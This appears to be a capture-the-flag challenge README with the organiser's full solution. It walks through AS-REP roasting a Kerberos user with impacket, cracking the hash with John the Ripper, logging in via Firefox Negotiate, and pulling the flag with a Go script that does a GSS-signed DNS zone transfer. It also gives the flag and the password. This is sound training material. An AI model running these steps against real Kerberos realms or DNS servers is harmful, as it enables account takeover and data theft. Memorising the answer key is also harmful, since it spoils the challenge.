@@ -1,0 +1,180 @@
+# tickets-plz - hard
+
+## Description
+
+Looks like Dr. Tom Lei is back at it again with another website. This time it appears to be more than just a web server though. Can you login and find the flag?
+
+## Connection URL
+
+<http://web.tickets-plz.aws.jerseyctf.com>
+
+## Knowledge or Tools Needed
+
+* Kerberos
+* DNS
+
+## Flag
+
+`jctfv{dr_t0ms_sup3r_dup3r_s3cr3t_flag_bsNy2S9hXwBS9pBf}`
+
+## Credit
+
+[Noah Jacobson](https://noahjacobson.com)
+
+## Solution Steps
+
+These below steps were done on Linux. While it is probably possible to complete the challenge on Windows as well, steps will not be provided for it. Use a VM if needed.
+
+1. There are numerous clues on the website that will guide throughout the rest of the challenge.
+    * The user registration page (which returns an error when attempted to be used) includes `@TICKETS-PLZ.AWS.JERSEYCTF.COM` after the username. While this could be an email address, the all capitalization points towards it being a Kerberos realm.
+    * The registration page requires a numeric password of 6 digits. This will make cracking the password in later steps easier.
+    * Attempting to access the secure area returns a 401 Unauthorized error. The `WWW-Authenticate` header is set to `Negotiate`, [which indicates Kerberos authentication](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate#:~:text=Negotiate%20(Kerberos)%20authentication).
+    * The website says to direct complaints to `dr_tom_lei` which is the user that needs to be impersonated.
+    * Not on the site itself, but the `SOA` record for `tickets-plz.aws.jerseyctf.com` also points to `dr_tom_lei.tickets-plz.aws.jerseyctf.com` as a user (in SOA records, the @ in an email address is replaced with a period).
+2. It is now known that Kerberos is needed. The usual way to find the KDC (key distribution center) for a realm is through DNS. `dig SRV _kerberos._udp.tickets-plz.aws.jerseyctf.com` returns `86400 IN SRV 0 100 88 kdc.tickets-plz.aws.jerseyctf.com.`, pointing to `kdc.tickets-plz.aws.jerseyctf.com`.
+
+    * Alternative method: `kdc`, `web`, and `ns` are all running on the same host. An nmap service scan (`nmap -sV web.tickets-plz.aws.jerseyctf.com`) will also see the kdc.
+
+3. Now we know the KDC, the realm, and the user. But we still need a password. We know that the password is a 6 digit alphanumeric string, which is easily crackable offline. Assuming preauthentication is not required (which it is not), this can be done using an AS-REP roasting attack.
+
+    * Without preauthantication, Kerberos responds to an AS-REQ request with a response (AS-REP) encrypted with the user's password hash.
+    1. There are a handful of tools for this. The one used in these steps will be [impacket's GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) and John the Ripper.
+    2. First, download the script and install dependencies (can be done in a venv).
+        * `cd` to a working directory
+        * `wget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/GetNPUsers.py`
+        * `python -m venv .`
+        * `source bin/activate`
+        * `pip install impacket`
+    3. Now run the script
+        * `python GetNPUsers.py -request -format john -no-pass -dc-ip kdc.tickets-plz.aws.jerseyctf.com tickets-plz.aws.jerseyctf.com/dr_tom_lei`
+        * Output:
+
+          ```text
+          Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+          [*] Getting TGT for dr_tom_lei
+          $krb5asrep$18$TICKETS-PLZ.AWS.JERSEYCTF.COMdr_tom_lei$086a42ae953a65f7f9b8099f6908da7f3cb852f87581399c76ede823cd9d4408fea14187dc19e01462c6d7d659948d7a98f0b4f0e5b80e7ce15f44b0ee8abf890c4b55f59c20a5df0871defa338b948255cd8028a8ea171f714c19be5e435f741c44fd4b53d2cfc442ac9fcc52c483c21d585ea083d66d2ea4d90bcd4244dbe70cf34232350dbc4fe2671ecae37bef38eaa8952ea841f4e056086ef5dece11030353136b1a500be1287a69eede1924a7cb3cb4a17edf771525a6a559ec538a5d35bdcc41cddf778ed8743bce92780d46a1d0c0db59dd6407d84b36f023732f67e02c1ea0b534ffd31131d78388abeb670bc42fe784d77229184d14128b245ba6$e574ee6ac80080426531bc5d
+          ```
+
+    4. Copy the hash and paste it into a file, such as `kerb.hashes`. Now crack it. The password (`654321`) is simple enough that both bruteforce and any dictionary would find it.
+
+        * `john --incremental=digits --length=6 kerb.hashes`
+
+    5. Now we can setup Kerberos to sign into the website. For this, we will use Firefox. Participants can use [documentation](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/5/html/deployment_guide/sso-config-firefox) to figure this out.
+
+        1. Install Kerberos if not already (`sudo dnf install krb5-user` / `sudo dnf install krb5-workstation`). You can just hit enter on the setup prompts.
+        2. Edit `/etc/krb5.conf` and add in the realm info under `[realms]`.
+
+            ```text
+            TICKETS-PLZ.AWS.JERSEYCTF.COM = {
+                kdc = kdc.tickets-plz.aws.jerseyctf.com
+            }
+            ```
+
+        3. Also in `/etc/krb5.conf`, add the domain mappings underneath `[domain_realm]`
+
+            ```text
+            .tickets-plz.aws.jerseyctf.com = TICKETS-PLZ.AWS.JERSEYCTF.COM
+            tickets-plz.aws.jerseyctf.com = TICKETS-PLZ.AWS.JERSEYCTF.COM
+            ```
+
+        4. Kerberos will need to be able to resolve the server IP to its hostname. This requires adding an entry in `/etc/hosts`. Keep in mind this IP will be different, it's just the one pointing to the server (`dig we.btickets-plz.aws.jerseyctf.com`): `54.86.132.8     web.tickets-plz.aws.jerseyctf.com`
+
+        5. Run `kinit dr_tom_lei@TICKETS-PLZ.AWS.JERSEYCTF.COM` to get a ticket. Enter the password `654321` when prompted.
+
+        6. In Firefox navigate to `about:config` and search `negotiate`. Set both `network.negotiate-auth.trusted-uris` and `network.negotiate-auth.delegation-uris` to `.tickets-plz.aws.jerseyctf.com`.
+
+        7. Reload the page in Firefox and attempt to access the secure area. The browser may need to be restarted.
+
+        8. The secure area has more clues.
+            * "Stop hiding sensitive data in DNS" is a pretty obvious pointer that the flag is in DNS.
+            * The "Finish setting up secondary DNS server" bullet, and its sub-bullets, point to the `dr_tom_lei` principal having access to replicate the primary DNS server. This should hint towards `AXFR`.
+            * If the participant looks up the TXT record for the domain, they will get a hint: `dig TXT tickets-plz.aws.jerseyctf.com`
+                * `"HINT: How do DNS servers replicate eachother? What is RFC 3645?"`
+
+        9. We need to send an AXFR request signed with Kerberos (aka GSS). Microsoft Windows will do this commonly for DNS updates, but not AXFR. The only tool I found that could do this relatively simply was [this Go library](https://pkg.go.dev/github.com/bodgit/tsig?utm_source=godoc).
+            * See [the solvedns script](./challenge/configurationFiles/tickets-plz/solvedns/main.go) for an example.
+
+        10. Once the participant sends the request, they will see the flag in a TXT record for `secret-flag-cmtzhgaevd5qzdizae.tickets-plz.aws.jerseyctf.com`.
+
+## FAQ
+
+1. Server is not responding to participant.
+
+    * They may have tripped fail2ban's rate limiting. Check with:
+        * `sudo fail2ban-client status kdc-rate-limit`
+        * `sudo fail2ban-client status pdns-rate-limit`
+        * `sudo fail2ban-client status web-rate-limit`
+    * If so, it will clear in 1 minute.
+
+
+
+CODE (Main.go):
+package main
+
+import (
+"fmt"
+"os"
+"text/tabwriter"
+"time"
+
+"github.com/bodgit/tsig"
+"github.com/bodgit/tsig/gss"
+"github.com/miekg/dns"
+)
+
+func main() {
+dnsClient := new(dns.Client)
+t := new(dns.Transfer)
+dnsClient.Net = "tcp"
+
+gssClient, err := gss.NewClient(dnsClient)
+if err != nil {
+panic(err)
+}
+defer gssClient.Close()
+
+host := "ns.tickets-plz.aws.jerseyctf.com:53"
+
+// Negotiate a context with the chosen server using the
+// current user. See also gssClient.NegotiateContextWithCredentials()
+// and gssClient.NegotiateContextWithKeytab() for alternatives
+keyname, _, err := gssClient.NegotiateContext(host)
+if err != nil {
+panic(err)
+}
+
+dnsClient.TsigProvider = gssClient
+t.TsigProvider = gssClient
+
+// Use the DNS client as normal
+
+msg := new(dns.Msg)
+msg.SetAxfr("tickets-plz.aws.jerseyctf.com.")
+
+msg.SetTsig(keyname, tsig.GSS, 300, time.Now().Unix())
+
+c, err := t.In(msg, host)
+if err != nil {
+panic(err)
+}
+
+w := tabwriter.NewWriter(os.Stdout, 0, 1, 2, ' ', 0)
+fmt.Fprintln(w, "Go type\tName\tTTL\tClass\tRR type\tetc")
+for r := range c {
+if r.Error != nil {
+panic(r.Error)
+}
+for _, rr := range r.RR {
+fmt.Fprintf(w, "%T\t%[1]s\n", rr)
+}
+}
+w.Flush()
+fmt.Println("----------------------------------------------------------------")
+
+// Cleanup the context
+err = gssClient.DeleteContext(keyname)
+if err != nil {
+panic(err)
+}
+}
